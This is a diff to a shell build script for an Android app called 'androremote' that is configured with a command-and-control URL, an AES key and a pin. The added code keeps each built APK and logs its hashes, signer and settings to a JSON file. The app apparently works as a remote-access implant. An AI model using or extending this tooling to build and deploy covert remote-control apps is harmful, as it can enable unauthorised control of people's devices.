@@ -87,3 +87,68 @@ else
         --out "$OUT/androremote.apk" "$OUT/z2.apk"
 fi
 echo "OK: $OUT/androremote.apk (c2_url=${C2URL:-<none>} enc=${C2KEY:+AES-256-GCM} pin=${C2PIN:+set})"
+
+# ── build history: keep every artifact + record what it was baked with ──────
+# Records hold no secrets: the PSK is reduced to a short fingerprint, the
+# password never leaves the keystore.
+STAMP=$(date -u +%Y%m%dT%H%M%SZ)
+SLUG=$(printf '%s' "${C2URL:-direct}" | tr -c 'A-Za-z0-9._-' '-' | cut -c1-40)
+KEEP="$OUT/androremote-$STAMP-$SLUG.apk"
+cp "$OUT/androremote.apk" "$KEEP"
+
+PSK_FP=""
+if [ -n "$C2KEY" ]; then
+    # hash the decoded key bytes, matching core.key_fp() / /api/state
+    PSK_FP=$(PSK_HEX="$C2KEY" python3 -c "
+import binascii, hashlib, os
+raw = os.environ.get('PSK_HEX', '')
+try:
+    data = binascii.unhexlify(raw)
+except Exception:
+    data = raw.encode()
+print(hashlib.sha256(data).hexdigest()[:12] if data else '')
+")
+fi
+SIGNER=$("$J8/bin/keytool" -list -v -keystore "$KS" -storepass "$KSPASS" 2>/dev/null \
+    | grep -m1 -i "SHA256:" | sed 's/.*SHA256: *//' | tr -d ':' | tr 'A-Z' 'a-z')
+APK_SHA=$(shasum -a 256 "$KEEP" | cut -d' ' -f1)
+APK_SIZE=$(wc -c < "$KEEP" | tr -d ' ')
+
+AR_BUILT_AT="$STAMP" AR_FILE="$(basename "$KEEP")" AR_URL="${C2URL:-}" \
+AR_ENC="${C2KEY:+1}" AR_PIN="${C2PIN:+1}" AR_PSK_FP="$PSK_FP" AR_SIGNER="$SIGNER" \
+AR_SHA="$APK_SHA" AR_SIZE="$APK_SIZE" AR_KS="$(basename "$KS")" AR_JSON="$OUT/builds.json" \
+python3 - <<'PY'
+import json, os
+
+out = os.environ["AR_JSON"]
+try:
+    with open(out) as f:
+        records = json.load(f)
+except (OSError, ValueError):
+    records = []
+
+for r in records:
+    r["latest"] = False
+
+records.append({
+    "file": os.environ["AR_FILE"],
+    "latest": True,
+    "built_at": os.environ["AR_BUILT_AT"],
+    "c2_url": os.environ["AR_URL"],
+    "enc": bool(os.environ["AR_ENC"]),
+    "pin_set": bool(os.environ["AR_PIN"]),
+    "psk_fp": os.environ["AR_PSK_FP"] or None,
+    "signer_sha256": os.environ["AR_SIGNER"],
+    "sha256": os.environ["AR_SHA"],
+    "size": int(os.environ["AR_SIZE"]),
+    "keystore": os.environ["AR_KS"],
+})
+records = records[-50:]
+
+tmp = out + ".tmp"
+with open(tmp, "w") as f:
+    json.dump(records, f, indent=1)
+os.replace(tmp, out)
+PY
+
+echo "recorded: $KEEP ($(printf '%s' "$APK_SHA" | cut -c1-12), ${APK_SIZE} B)"
